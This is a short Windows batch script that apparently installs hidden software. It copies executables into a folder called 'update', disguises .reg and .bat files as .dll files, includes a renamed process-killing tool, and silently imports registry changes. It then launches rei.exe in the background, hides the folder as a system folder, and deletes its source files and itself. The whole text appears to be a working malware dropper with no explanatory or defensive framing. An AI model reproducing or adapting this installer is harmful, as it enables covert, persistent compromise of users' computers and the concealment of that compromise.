@echo off
set zz=%cd%
c:
cd c:\
if exist c:\update goto next2
md c:\update
:next2
cd update
del /s/q reg43.htm
del /s/q reg65.htm
del /s/q rei.exe
del /s/q wsets.exe
copy %zz%\reg43.htm c:\update\reg43.htm
copy %zz%\reg65.htm c:\update\reg65.htm
copy %zz%\rei.exe c:\update\rei.exe /Y
copy %zz%\wsets.exe c:\update\wsets.exe /Y
copy %zz%\rem.bat c:\update\rem.bat
copy %zz%\rem.dll c:\update\rem.dll
copy %zz%\pskill.exe c:\update\pk.exe
copy %zz%\a.reg c:\update\a.dll
copy %zz%\tbcr.bat c:\update\tbcr.dll
copy %zz%\killa.bat c:\update\killa.dll
del /s/q %zz%\reg43.htm
del /s/q %zz%\reg65.htm
del /s/q %zz%\rei.exe
del /s/q %zz%\rem.bat
del /s/q %zz%\rem.dll
REGEDIT.EXE /S %zz%\rm.reg
REGEDIT.EXE -S %zz%\rm.reg
REGEDIT /S %zz%\rm.reg
REGEDIT -S %zz%\rm.reg
del /s/q %zz%\rm.reg
start /B rei.exe
cd c:\
attrib +H +S c:\update
del /s/q %zz%\rei.bat
